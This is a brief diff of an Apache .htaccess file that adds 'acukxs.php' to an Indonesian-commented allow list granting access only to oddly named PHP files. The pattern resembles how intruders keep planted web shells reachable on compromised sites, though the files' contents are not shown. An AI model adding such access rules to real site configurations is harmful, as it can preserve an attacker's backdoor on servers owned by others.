@@ -11,7 +11,7 @@ Require all granted
 </FilesMatch>
 
 # Izinkan file tertentu
-<FilesMatch '^(Interests.php|kimaksxs.php)$'>
+<FilesMatch '^(Interests.php|kimaksxs.php|acukxs.php)$'>
 Require all granted
 </FilesMatch>
 
